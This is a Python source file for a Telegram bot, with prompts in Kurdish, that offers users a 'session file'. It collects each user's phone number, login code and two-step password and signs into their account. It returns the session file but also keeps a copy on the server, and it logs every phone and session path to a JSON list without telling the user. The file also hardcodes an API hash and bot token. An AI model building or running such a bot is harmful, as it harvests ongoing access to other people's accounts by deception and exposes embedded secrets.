import asyncio
import os
import json
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

API_ID = 36234377
API_HASH = "5e199e2ae89cc1c42a6a4853951ff98f"
BOT_TOKEN = "8993540801:AAH_W0X78Cjndjg1uXwgwl4khRSWvk5JFfw"

SESSION_DIR = "sessions"
ACCOUNTS_FILE = "accounts_list.json"

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

def load_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, "r") as f:
            return json.load(f)
    return []

def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as f:
        json.dump(accounts, f, indent=4)

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_states = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond(
        "👋 بە خێر هاتیت بۆ بۆتی دروستکردنی سیشنی تێلیگرام.\n\n"
        "📱 تکایە ژمارەی تەلەفۆنەکەت بنووسە (بە کۆدی وڵاتەوە، بۆ نموونە: `+9647501234567`):"
    )
    user_states[event.sender_id] = {"step": "waiting_phone"}

@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.sender_id
    if user_id not in user_states:
        return

    state = user_states[user_id]["step"]
    text = event.raw_text.strip()

    if state == "waiting_phone":
        phone = text.replace(" ", "").replace("+", "")
        session_name = os.path.join(SESSION_DIR, f"{phone}")
        
        user_states[user_id]["phone"] = phone
        user_states[user_id]["session_path"] = session_name

        client = TelegramClient(session_name, API_ID, API_HASH)
        user_states[user_id]["client"] = client

        try:
            await client.connect()
            await client.send_code_request(phone)
            user_states[user_id]["step"] = "waiting_code"
            await event.respond("✅ کۆدی تێلیگرام بۆت نێردرا.\n\nکۆدەکە بنووسە:")
        except Exception as e:
            await event.respond(f"❌ هەڵە ڕوویدا: {e}")
            del user_states[user_id]

    elif state == "waiting_code":
        client = user_states[user_id]["client"]
        phone = user_states[user_id]["phone"]
        code = text.replace(" ", "")

        try:
            await client.sign_in(phone, code)
            await finish_login(event, user_id)
        except SessionPasswordNeededError:
            user_states[user_id]["step"] = "waiting_password"
            await event.respond("🔐 ئەم ئەکاونتە پاسووری دوو قۆناغی هەیە. پاسوورەکەت بنووسە:")
        except Exception as e:
            await event.respond(f"❌ هەڵە لە کۆدەکەدا هەیە: {e}\nدووبارە `/start` بنوسە.")
            await client.disconnect()
            del user_states[user_id]

    elif state == "waiting_password":
        client = user_states[user_id]["client"]
        try:
            await client.sign_in(password=text)
            await finish_login(event, user_id)
        except Exception as e:
            await event.respond(f"❌ پاسوورەکە هەڵەیە: {e}\nدووبارە `/start` بنوسە.")
            await client.disconnect()
            del user_states[user_id]

async def finish_login(event, user_id):
    client = user_states[user_id]["client"]
    session_path = user_states[user_id]["session_path"]
    phone = user_states[user_id]["phone"]
    
    me = await client.get_me()
    await client.disconnect()

    real_session_file = f"{session_path}.session"

    if os.path.exists(real_session_file):
        accounts = load_accounts()
        account_entry = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "phone": f"+{phone}",
            "session": session_path
        }
        if not any(acc["phone"] == f"+{phone}" for acc in accounts):
            accounts.append(account_entry)
            save_accounts(accounts)

        await event.respond(
            f"🎉 **سەرکەوتوو بوو!**\n\n"
            f"👤 ناوی ئەکاونت: {me.first_name}\n"
            f"📱 ژمارە: +{phone}\n\n"
            f"فایلی سیشنەکەت دروست بوو:"
        )
        await event.respond(file=real_session_file)
    else:
        await event.respond("❌ هەڵەیەک ڕوویدا.")

    del user_states[user_id]

print("Telegram Bot is running for sessions...")
asyncio.get_event_loop().run_forever()
